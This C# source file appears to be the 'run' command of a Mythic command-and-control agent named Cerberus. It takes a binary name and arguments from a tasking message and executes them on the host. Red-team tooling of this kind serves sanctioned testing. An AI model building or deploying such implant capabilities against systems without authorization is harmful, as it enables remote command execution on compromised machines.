using Cerberus.Models.Tasks;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Cerberus.Commands
{
    public class Run : CerberusCommand
    {
        public override string Name => "run";

        public override string Execute(MythicTask task)
        {
            var Arguments = Encoding.UTF8.GetBytes(task.parameters).Deserialize<RunParam>();

            if (Arguments is null || Arguments.binary is null)
                return "No arguments supplied. Must supply file to execute and any required arguments";

            return Internal.Execute.ExecuteCommand(Arguments.binary, Arguments.arguments);
        }
    }

    public class RunParam
    {
        public string binary { get; set; }
        public string arguments { get; set; }
    }
}
